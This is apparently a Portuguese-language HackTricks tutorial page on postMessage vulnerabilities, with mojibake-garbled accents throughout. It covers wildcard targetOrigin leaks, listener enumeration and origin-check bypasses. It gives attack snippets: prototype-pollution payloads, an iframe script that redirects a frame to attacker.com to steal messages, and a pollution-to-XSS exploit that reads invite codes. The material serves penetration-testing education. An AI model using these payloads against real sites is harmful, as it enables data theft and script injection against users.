# Vulnerabilidades do PostMessage

## Vulnerabilidades do PostMessage

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Enviar **PostMessage**

O **PostMessage** usa a seguinte fun√ß√£o para enviar uma mensagem:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Observe que **targetOrigin** pode ser um '\*' ou uma URL como _https://company.com._\
No **segundo cen√°rio**, a **mensagem s√≥ pode ser enviada para aquele dom√≠nio** (mesmo que a origem do objeto da janela seja diferente).\
Se o **curinga** for usado, **mensagens podem ser enviadas para qualquer dom√≠nio**, e ser√£o enviadas para a origem do objeto da janela.

### Atacando iframe e curinga em **targetOrigin**

Conforme explicado neste [**relat√≥rio**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), se voc√™ encontrar uma p√°gina que possa ser **inserida em um iframe** (sem prote√ß√£o `X-Frame-Header`) e que esteja **enviando mensagens sens√≠veis** via **postMessage** usando um **curinga** (\*), voc√™ pode **modificar** a **origem** do **iframe** e **vazar** a **mensagem sens√≠vel** para um dom√≠nio controlado por voc√™.\
Observe que se a p√°gina puder ser inserida em um iframe, mas o **targetOrigin** estiver **definido como uma URL e n√£o como um curinga**, esse **truque n√£o funcionar√°**.
```markup
<html>
   <iframe src="https://docs.google.com/document/ID" />
   <script>
      setTimeout(exp, 6000); //Wait 6s
      
      //Try to change the origin of the iframe each 100ms
      function exp(){
          setInterval(function(){ 
              window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
          }, 100);
      }
   </script>
```
## Explora√ß√£o do addEventListener

**`addEventListener`** √© a fun√ß√£o usada pelo JS para declarar a fun√ß√£o que est√° **esperando `postMessages`**.\
Um c√≥digo semelhante ao seguinte ser√° usado:
```javascript
window.addEventListener("message", (event) => {
  if (event.origin !== "http://example.org:8080")
    return;

  // ...
}, false);
```
Observe neste caso como a **primeira coisa** que o c√≥digo faz √© **verificar a origem**. Isso √© terrivelmente **importante**, principalmente se a p√°gina for fazer **qualquer coisa sens√≠vel** com as informa√ß√µes recebidas (como alterar uma senha). **Se n√£o verificar a origem, os atacantes podem fazer as v√≠timas enviarem dados arbitr√°rios para esses endpoints** e alterar as senhas das v√≠timas (neste exemplo).

### Enumera√ß√£o

Para **encontrar ouvintes de eventos** na p√°gina atual, voc√™ pode:

* **Procurar** o c√≥digo JS por `window.addEventListener` e `$(window).on` (vers√£o _JQuery_)
* **Executar** no console das ferramentas do desenvolvedor: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Ir para** _Elementos --> Ouvintes de eventos_ nas ferramentas do desenvolvedor do navegador

![](<../../.gitbook/assets/image (617).png>)

* Usar uma **extens√£o do navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Essas extens√µes do navegador ir√£o **interceptar todas as mensagens** e mostr√°-las para voc√™.

### Bypasses b√°sicos de verifica√ß√£o de origem

* Se **`indexOf()`** √© usado para **verificar** a **origem** do evento PostMessage, lembre-se de que ele pode ser facilmente contornado, como no exemplo a seguir: `("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")`\\
* Se **`search()`** √© usado para **validar** a **origem**, pode ser inseguro. De acordo com a documenta√ß√£o de `String.prototype.search()`, o m√©todo **recebe um objeto de express√£o regular** em vez de uma string. Se algo diferente de uma express√£o regular for passado, ele ser√° convertido implicitamente em uma express√£o regular.\
  Na express√£o regular, **um ponto (.) √© tratado como um caractere curinga**. Um atacante pode tirar proveito disso e **usar** um **dom√≠nio especial** em vez do oficial para contornar a valida√ß√£o, como em: `"https://www.safedomain.com".search("www.s.fedomain.com")`.\\
* Se a fun√ß√£o **`escapeHtml`** √© usada, a fun√ß√£o n√£o cria um objeto escapado `new`, em vez disso, ela **sobrescreve propriedades** do objeto existente. Isso significa que, se pudermos criar um objeto com uma propriedade controlada que n√£o responda a `hasOwnProperty`, ela n√£o ser√° escapada.
```javascript
// Expected to fail:
result = u({
  message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
O objeto `File` √© perfeito para este exploit, pois ele tem uma propriedade somente leitura `name` que √© usada pelo nosso modelo e ir√° contornar a fun√ß√£o `escapeHtml`.

### Contornando e.origin == window.origin

Quando uma p√°gina √© incorporada em um **iframe com sandbox** via `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`, a **origem** desse **iframe** ser√° **`null`**.

Quando o valor de **sandbox `allow-popups` √© definido**, ent√£o a **popup aberta** ir√° **herdar** todos os **atributos com sandbox** a menos que `allow-popups-to-escape-sandbox` seja definido.\
Portanto, abrir uma **popup** a partir de uma **origem nula** far√° com que **`window.origin`** dentro da popup tamb√©m seja **`null`**.

Portanto, se voc√™ abrir um **iframe com sandbox** permitindo popups e, em seguida, **abrir uma popup** de dentro do iframe e **enviar uma postMessage** do iframe **para a popup**, ambas as origens s√£o nulas, ent√£o: **`e.origin == window.origin == null`**

Para mais informa√ß√µes, **leia**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Contornando e.source

Voc√™ pode for√ßar o **`e.source`** de uma mensagem a ser nulo criando um **iframe** que **envia** a **postMessage** e √© **imediatamente exclu√≠do**.

Para mais informa√ß√µes, **leia:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Contornando o cabe√ßalho X-Frame

Para realizar esses ataques, idealmente voc√™ ser√° capaz de **colocar a p√°gina da v√≠tima** dentro de um `iframe`. Mas alguns cabe√ßalhos como `X-Frame-Header` podem **impedir** esse **comportamento**.\
Nesses cen√°rios, voc√™ ainda pode usar um ataque menos furtivo. Voc√™ pode abrir uma nova guia para a aplica√ß√£o web vulner√°vel e se comunicar com ela:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Roubo de mensagem enviada para filho bloqueando a p√°gina principal

Na p√°gina a seguir, voc√™ pode ver como pode roubar dados **sens√≠veis de postmessage** enviados para um **iframe filho** **bloqueando** a p√°gina **principal** antes de enviar os dados e abusando de um **XSS no filho** para **vazar os dados** antes que sejam recebidos:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Roubo de mensagem modificando a localiza√ß√£o do iframe

Se voc√™ pode criar um iframe de uma p√°gina sem o cabe√ßalho X-Frame, que cont√©m outro iframe, voc√™ pode **alterar a localiza√ß√£o do iframe filho**, ent√£o, se ele estiver recebendo um **postmessage** enviado usando um **curinga**, um invasor poderia **alterar** a **origem** desse iframe para uma p√°gina **controlada** por ele e **roubar** a mensagem:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage para Prototype Pollution e/ou XSS

Em cen√°rios em que os dados enviados por meio de `postMessage` s√£o executados por JS, voc√™ pode **criar um iframe** na **p√°gina** e **explorar** a **polui√ß√£o de prot√≥tipo/XSS** enviando a explora√ß√£o via `postMessage`.

Alguns **XSS muito bem explicados por meio de `postMessage`** podem ser encontrados em [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Exemplo de uma explora√ß√£o para abusar da **polui√ß√£o de prot√≥tipo e depois XSS** por meio de um `postMessage` para um `iframe`:
```markup
<html>
<body>
    <iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
        function get_code() {
            document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
            document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
        }

        setTimeout(get_code, 2000);
    </script>
</body>
</html>
```
Para **mais informa√ß√µes**:

* Link para a p√°gina sobre [**polui√ß√£o de prot√≥tipo**](../deserialization/nodejs-proto-prototype-pollution/)
* Link para a p√°gina sobre [**XSS**](../xss-cross-site-scripting/)
* Link para a p√°gina sobre [**polui√ß√£o de prot√≥tipo do lado do cliente para XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Refer√™ncias

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Para praticar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
